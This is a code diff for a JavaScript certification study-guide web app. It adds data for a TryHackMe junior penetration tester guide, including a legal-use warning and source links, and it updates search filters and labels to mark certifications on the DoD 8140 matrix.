+    {lab:"The rules",big:"Written OK",text:"Testing a system without written permission is a federal crime under the Computer Fraud and Abuse Act. Practice only in legal labs and on machines you own.",after:"On Coast Guard networks, only authorized assessment teams test. Never scan a work network to practice."}],
+  sources:[
+    ["TryHackMe: PT1 certification","https://tryhackme.com/certification/junior-penetration-tester"],
+    ["TryHackMe Help: PT1 training content","https://help.tryhackme.com/en/articles/11172303-pt1-training-content"],
+    ["TryHackMe Help: certification access and retakes","https://help.tryhackme.com/en/articles/10624994-certification-access"],
+    ["TryHackMe Help: renewals","https://help.tryhackme.com/en/articles/10625059-renewals"],
+    ["Credly: TryHackMe PT1 badge","https://www.credly.com/org/tryhackme/badge/jr-penetration-tester-pt1"],
+    ["Candidate review with section points (third-party, verify)","https://moetezbenabdallah.github.io/posts/PT1-Review"],
+    ["DoD 8140 qualification matrix V2.1 (DoD Cyber Exchange)","https://dl.dod.cyber.mil/wp-content/uploads/8140/pdf/(U)%202025-09-19_DoD8140MatrixV2.1_DoPSR.pdf"]]
+};
+
 var G_SECS=[["obj","Objectives"],["plan","Study plan"],["res","Resources"],["quiz","Quiz"],["pbq","PBQs"],["map","Roadmap"],["keep","Keep it"]];
 var G_ICON_EXT='<svg viewBox="0 0 12 12" aria-hidden="true"><path d="M4 2h6v6M10 2 3 9" fill="none" stroke="currentColor" stroke-width="1.3" stroke-linecap="round"/></svg>';
 
@@ -5629,7 +6071,7 @@ function renderGuide(i,name){
   var h='';
   h+='<nav class="g-nav pr" aria-label="Guide sections"><button type="button" class="g-nav-back" id="g-nav-back" aria-label="Back to '+gEsc(v.name)+'"><span class="ar" aria-hidden="true">&larr;</span><span class="gb-full">'+gEsc(v.name)+'</span><span class="gb-short" aria-hidden="true">'+gEsc(v.short)+'</span></button><span class="g-nav-lab" aria-hidden="true">Jump to</span><div class="g-nav-in" id="g-nav">'+G_SECS.map(function(s,k){return '<button type="button" data-sec="'+s[0]+'"'+(k?'':' aria-current="true"')+'><span>'+pad2(k+1)+'</span>'+s[1]+'</button>';}).join("")+'<span class="g-nav-ind" aria-hidden="true"></span></div></nav>';
   h+='<div class="p-hero g-hero"><div class="p-hero-main"><p class="p-eyebrow pr"><span>'+gEsc(v.name)+'</span> / '+gEsc(c[1])+' &nbsp;&middot;&nbsp; Cert guide</p>'+
-     '<h2 id="p-title" aria-label="'+gEsc(name)+'"><span aria-hidden="true">'+splitTitle(name+".")+'</span></h2>'+
+     '<h2 id="p-title" aria-label="'+gEsc(G.title||name)+'"><span aria-hidden="true">'+splitTitle((G.title||name)+".")+'</span></h2>'+
      '<p class="g-lead pr">'+gEsc(G.lead)+'</p></div>'+
      '<aside class="p-aside pr g-ver"><p class="lab">'+gEsc(G.verLabel||"Exam version")+'</p>'+
      (Object.keys(G.versions).length>1?'<div class="seg g-vseg" role="group" aria-label="'+gEsc(G.verLabel||"Exam version")+'">'+Object.keys(G.versions).map(function(k){var V=G.versions[k];return '<button type="button" data-ver="'+k+'" aria-pressed="'+(k===gVer)+'">'+V.label+' &middot; '+V.code+'</button>';}).join("")+'<span class="seg-ind" aria-hidden="true"></span></div>':'<p class="g-vone">'+gEsc(G.versions[gVer].label)+' &middot; '+gEsc(G.versions[gVer].code)+'</p>')+
@@ -5662,7 +6104,7 @@ function renderGuide(i,name){
   h+='<section class="g-sec" id="g-quiz" data-sec="quiz">'+head(4,"quiz",(function(){var k=Object.keys(G.versions)[0],n=G.quiz.filter(function(q){return !q.v||q.v===k;}).length,w=["","One","Two","Three","Four","Five","Six","Seven","Eight","Nine","Ten","Eleven","Twelve","Thirteen","Fourteen","Fifteen"][n];return (w||n)+"-question check.";})(),"Original questions written at or above exam difficulty. Answer order shuffles every attempt, and every option has an explanation.")+
      '<div class="g-quiz g-rv" id="g-qz" aria-live="polite"></div></section>';
   // 05 PBQs
-  h+='<section class="g-sec" id="g-pbq" data-sec="pbq">'+head(5,"pbq","Performance-based practice.","Hands-on tasks like the ones at the start of the exam. Work them, then check your answers.")+
+  h+='<section class="g-sec" id="g-pbq" data-sec="pbq">'+head(5,"pbq","Performance-based practice.",gEsc(G.pbqSub||"Hands-on tasks like the ones at the start of the exam. Work them, then check your answers."))+
      '<div class="g-ptabs g-rv seg" id="g-ptabs" role="group" aria-label="Choose a PBQ">'+G.pbqs.map(function(p,k){return '<button type="button" data-p="'+k+'" aria-pressed="'+(k===0)+'">PBQ '+pad2(k+1)+' &middot; '+gEsc(p.short)+'</button>';}).join("")+'<span class="seg-ind" aria-hidden="true"></span></div>'+
      '<div class="g-pbq g-rv" id="g-pbqv"></div></section>';
   // 06 roadmap
@@ -6096,21 +6538,21 @@ var ALIAS={"A+":"a plus core 1 core 2 220-1101 220-1102 220-1201 220-1202 v15 he
  "SecurityX":"securityx security x casp casp plus cas-005 v5 advanced security practitioner architect engineer guide","CC":"certified in cybersecurity isc2 cc entry level cyber beginner no experience 2026 outline guide","SSCP":"systems security certified practitioner sscp isc2 practitioner 2025 outline cat adaptive security administration operations associate of isc2 guide",
  "CCSP":"certified cloud security professional ccsp isc2 cloud security 2026 outline cat adaptive shared responsibility csa ccsk guide","CISSP":"certified information systems security professional cissp isc2 2024 outline cat adaptive associate of isc2 risk management leadership manager guide","CCST Networking":"100-150 cisco certified support technician",
  "CCST Cybersecurity":"100-160 cisco certified support technician","CyberOps Associate":"200-201 cbrops soc blue team","CCNA":"200-301 routing switching",
- "CCNP Security":"350-701 scor","SAL1 · Security Analyst L1":"sal1 sal 1 soc analyst blue team","PT1 · Junior Pentester":"pt1 jr junior pentest red team",
+ "CCNP Security":"350-701 scor","SAL1 · Security Analyst L1":"sal1 sal 1 soc analyst level 1 blue team soc simulator tryhackme thm guide","PT1 · Junior Pentester":"pt1 pt 1 jr junior pentest penetration tester red team tryhackme thm guide",
  "Linux Essentials":"010-160 lpi","LPIC-1":"lpic1 101-500 102-500","Cloud Practitioner":"clf-c02 ccp aws amazon","Solutions Architect Associate":"saa saa-c03 aws amazon",
  "Security Specialty":"scs-c02 scs-c03 aws amazon","Azure Fundamentals":"az-900 microsoft","Azure Administrator":"az-104 microsoft","Azure Security Engineer":"az-500 microsoft",
  "Project+":"project plus pk0-005 project management"};
 var POPULAR=["Security+","Network+","CCNA","CISSP","SAL1 · Security Analyst L1","Cloud Practitioner"];
-var FILTERS=[["all","All"],["Stay 20","Stay 20"],["Cyber eng","Cyber"],["Cloud security","Cloud"],["Network eng","Network"],["iat","DoD IAT"]];
+var FILTERS=[["all","All"],["Stay 20","Stay 20"],["Cyber eng","Cyber"],["Cloud security","Cloud"],["Network eng","Network"],["d8140","DoD 8140"]];
 function snorm(s){return String(s).toLowerCase().replace(/\+/g," plus ").replace(/[^a-z0-9]+/g," ").trim();}
 function sesc(s){return String(s).replace(/[&<>"']/g,function(c){return {"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c];});}
 var SIDX=[];
 (function(){
   var WG=VENDORS.length-1;
-  function iatAlt(i){if(!i) return "";var n={"I":1,"II":2,"III":3}[i.split(" ")[1]];return i+" iat"+n+" iat "+n+" dod 8140 8570 baseline";}
+  function iatAlt(i){if(!i) return "";var n={"I":1,"II":2,"III":3}[i.split(" ")[1]];return i+" iat"+n+" iat "+n+" dod 8570 baseline";}
   function addCert(c,i,label){
-    var e={kind:"cert",key:"c:"+c[0],name:c[0],v:i,vendor:label,lvl:c[1],d:c[2],hrs:c[3],iat:c[4],tags:c[5].slice(),wgu:i===WG,
-      fields:[[snorm(c[0]),100],[snorm(ALIAS[c[0]]||""),70],[snorm(label+" "+VENDORS[i].short+" "+VENDORS[i].name),40],[snorm(c[1]+" "+iatAlt(c[4])+" "+c[5].join(" ")),30]]};
+    var e={kind:"cert",key:"c:"+c[0],name:c[0],v:i,vendor:label,lvl:c[1],d:c[2],hrs:c[3],iat:c[4],d8:is8140(c[0]),tags:c[5].slice(),wgu:i===WG,
+      fields:[[snorm(c[0]),100],[snorm(ALIAS[c[0]]||""),70],[snorm(label+" "+VENDORS[i].short+" "+VENDORS[i].name),40],[snorm(c[1]+" "+iatAlt(c[4])+(is8140(c[0])?" dod 8140 approved":"")+" "+c[5].join(" ")),30]]};
     if(i===WG) e.fields.push([snorm("wgu degree bs csia"),25]);
     SIDX.push(e);
   }
@@ -6153,7 +6595,7 @@ function sScore(e,toks,qc){
 function sPass(e){
   if(srchFilter==="all") return true;
   if(e.kind!=="cert") return false;
-  if(srchFilter==="iat") return !!e.iat;
+  if(srchFilter==="d8140") return !!e.d8;
   return e.tags.indexOf(srchFilter)>=0||e.tags.indexOf("All paths")>=0;
 }
 function sRecent(){try{var r=JSON.parse(localStorage.getItem("cgcp.recent")||"[]");return Array.isArray(r)?r.filter(function(x){return typeof x==="string";}).slice(0,4):[];}catch(err){return [];}}
@@ -6177,7 +6619,7 @@ function sGroups(){
     if(srchFilter!=="all"){
       var list=SIDX.filter(function(e){return e.kind==="cert"&&sPass(e);}).sort(function(a,b){return a.d-b.d;});
       var lbl=FILTERS.filter(function(f){return f[0]===srchFilter;})[0][1];
-      groups.push({label:(srchFilter==="iat"?"DoD IAT baseline":lbl+" path")+" · easiest first",items:list});
+      groups.push({label:(srchFilter==="d8140"?"On the DoD 8140 matrix":lbl+" path")+" · easiest first",items:list});
     } else {
       var rec=sRecent().map(sByKey).filter(Boolean);
       if(rec.length) groups.push({label:"Recent",items:rec});
@@ -6202,11 +6644,11 @@ function sRow(e,i,raw){
   if(e.kind==="cert"){
     sub=e.vendor+" · "+e.lvl+(GUIDES[e.name]?" · Full guide":"")+(e.v===VENDORS.length-1?" · WGU degree line":(e.wgu?" · also in WGU degree":""));
     var bars="";for(var j=1;j<=5;j++) bars+='<i class="'+(j<=e.d?"on":"")+'"></i>';
-    meta='<span class="sr-meta"><span class="sr-bars" aria-hidden="true">'+bars+'</span><span class="sr-hrs">'+e.hrs+'</span><span class="sr-iat'+(e.iat?"":" none")+'">'+(e.iat||"—")+'</span></span>';
+    meta='<span class="sr-meta"><span class="sr-bars" aria-hidden="true">'+bars+'</span><span class="sr-hrs">'+e.hrs+'</span><span class="sr-iat'+(e.d8?"":" none")+'" title="'+(e.d8?"On the DoD 8140 matrix":"Not on the DoD 8140 matrix")+'">'+(e.d8?"8140":"—")+'</span></span>';
   } else if(e.kind==="vendor"){
     var V=VENDORS[e.v];sub="Vendor line · "+V.certs.length+" certs";meta='<span class="sr-meta"><span class="sr-hrs">'+pad2(e.v+1)+' / '+pad2(VENDORS.length)+'</span></span>';
   } else {sub=e.sub;meta='<span class="sr-meta"></span>';}
-  var label=e.name+(e.kind==="cert"?", "+e.vendor+", "+e.lvl+", difficulty "+e.d+" of 5, "+e.hrs+(e.iat?", "+e.iat:""):e.kind==="vendor"?", vendor line":", page");
+  var label=e.name+(e.kind==="cert"?", "+e.vendor+", "+e.lvl+", difficulty "+e.d+" of 5, "+e.hrs+(e.d8?", on the DoD 8140 matrix":""):e.kind==="vendor"?", vendor line":", page");
   return '<div class="sr-opt k-'+e.kind+'" role="option" id="sr-o-'+i+'" data-i="'+i+'" aria-selected="false" aria-label="'+sesc(label)+'" style="--vc:'+vc+'">'+
     '<span class="sr-dot" aria-hidden="true"></span><span class="sr-main" aria-hidden="true"><span class="sr-name">'+name+'</span><span class="sr-sub">'+sesc(sub)+'</span></span>'+meta+
     '<span class="sr-go" aria-hidden="true">↵</span></div>';
@@ -6614,8 +7056,8 @@ function drawPoster(v,c,i,total){
   g.font="600 8.5px Geist, system-ui, sans-serif";g.fillStyle="rgba(255,255,255,.62)";
   var lbl=v.name.toUpperCase().split("").join(String.fromCharCode(8202));g.fillText(lbl,18,28);
   g.font="500 9.5px 'IBM Plex Mono', ui-monospace, monospace";g.textAlign="right";g.fillText(pad2(i+1)+" / "+pad2(total),282,28);
-  if(c[4]){g.font="600 8.5px Geist, system-ui, sans-serif";var tw=g.measureText(c[4]).width+16;g.strokeStyle="rgba("+A+",.8)";g.lineWidth=1;
-    g.beginPath();if(g.roundRect) g.roundRect(282-tw+.5,40.5,tw,17,8.5); else g.rect(282-tw+.5,40.5,tw,17);g.stroke();g.fillStyle="#fff";g.textAlign="center";g.fillText(c[4],282-tw/2,52);}
+  var pl=is8140(c[0])?"DOD 8140":"";if(pl){g.font="600 8.5px Geist, system-ui, sans-serif";var tw=g.measureText(pl).width+16;g.strokeStyle="rgba("+A+",.8)";g.lineWidth=1;
+    g.beginPath();if(g.roundRect) g.roundRect(282-tw+.5,40.5,tw,17,8.5); else g.rect(282-tw+.5,40.5,tw,17);g.stroke();g.fillStyle="#fff";g.textAlign="center";g.fillText(pl,282-tw/2,52);}
   g.textAlign="left";
   var name=c[0], fs=40;g.font="700 "+fs+"px 'Inter Tight', Geist, system-ui, sans-serif";
   while(g.measureText(name).width>264&&fs>18){fs-=1;g.font="700 "+fs+"px 'Inter Tight', Geist, system-ui, sans-serif";}
